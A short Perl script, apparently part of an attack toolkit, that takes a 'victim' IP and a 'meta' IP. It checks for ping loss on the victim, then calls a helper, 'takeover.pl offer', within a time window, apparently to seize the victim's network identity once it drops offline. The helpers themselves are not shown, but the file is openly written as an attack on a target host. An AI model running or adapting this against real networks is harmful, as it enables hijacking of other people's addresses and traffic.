#!/usr/bin/perl

use strict;
use warnings;
use FindBin qw($Bin);

my $victim_ip = shift @ARGV;
my $meta_ip = shift @ARGV;

die "Usage: $0 victim-ip-address meta-ip-address\n" if(!$meta_ip);

my $timeframe_sec = $ENV{TIMEFRAME_SEC} || 15;

my $rc = system("$Bin/detect-ping-timeout.pl", $victim_ip);
die "\n\nNo ping loss?\n" if($rc);

my $min_ts = time();
my $max_ts = $min_ts+$timeframe_sec;

system("$Bin/takeover.pl offer $victim_ip $meta_ip $min_ts $max_ts");
